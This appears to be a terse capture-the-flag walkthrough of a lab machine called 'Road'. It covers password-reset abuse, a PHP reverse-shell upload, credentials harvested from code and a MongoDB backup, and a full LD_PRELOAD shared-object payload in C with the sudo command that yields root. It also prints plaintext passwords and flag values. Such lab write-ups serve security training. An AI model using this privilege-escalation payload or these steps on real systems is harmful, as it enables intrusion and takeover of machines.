# Road 

> VOiD | Wednesday 08 December 2021 05:25:22 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.83.59

## PORT 80 [http]
```bash
/phpMyAdmin

/register.html
test creds -> aa@gmail.com:aa

http://10.10.83.59/v2/ResetUser.php

http://10.10.83.59/v2/profile.php
Right now, only admin has access to this feature. Please drop an email to admin@sky.thm in case of any changes. 

admin@sky.thm

lets reset its password

new creds -> admin@sky.thm:aa
upload reverse shell
comment tells path /v2/profileimages
http://10.10.83.59/v2/profileimages/rev.php
```

## USER [www-data]
```bash
www-data@sky:/var/www/html/v2$ cat lostpassword.php 
<?php

session_start();

$con = mysqli_connect('localhost','root','ThisIsSecurePassword!');
$db = mysqli_select_db($con, 'SKY');


```

```bash
mongo
> show dbs
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
> use admin
switched to db admin
> db.getCollection()
Error: collection constructor called with undefined argument :
DB.prototype.getCollection@src/mongo/shell/db.js:36:12
@(shell):1:1
> db.getCollectionNames()
[ "system.version" ]
> use backup
switched to db backup
> db.getCollectionNames()
[ "collection", "user" ]
> db.user.find()
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "BahamasChapp123!@#" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }

```
creds : webdeveloper:BahamasChapp123!@#

## USER [webdeveloper]
```bash
cat user.txt 
63191e4ece37523c9fe6bb62a5e64d45

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility

sudo /usr/bin/sky_backup_utility
uses tar to do compress
tar -czvf /root/.backup/sky-backup.tar.gz /var/www/html/*
it wont work


env_keep+=LD_PRELOAD

root@sky:/tmp# cat shell.c
```
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}

```
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility

cat root.txt 
3a62d897c40a815ecbe267df2f533ac6

```

